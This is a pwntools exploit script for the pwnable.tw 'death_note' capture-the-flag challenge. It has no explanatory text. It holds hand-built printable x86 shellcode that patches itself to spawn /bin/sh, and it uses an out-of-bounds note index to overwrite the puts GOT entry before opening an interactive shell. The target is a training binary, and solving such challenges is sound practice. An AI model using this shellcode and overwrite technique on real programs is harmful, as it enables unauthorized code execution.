from pwn import *

server = remote('chall.pwnable.tw', 10201)
elf = ELF('death_note')

shellcode = '''
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl
    push ecx
    pop edx
    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b
    push edx
    pop edx
    push edx
    pop edx
'''

puts_got = elf.got['puts']
note_addr = 0x0804a060
off_set = puts_got - note_addr
index = off_set/4
shellcode = asm(shellcode) + '\x6b\x40'

server.recvuntil('Your choice :')
server.sendline('1')
server.recvuntil('Index :')
server.sendline(str(index))
server.recvuntil('Name :')
server.sendline(shellcode)
server.interactive()
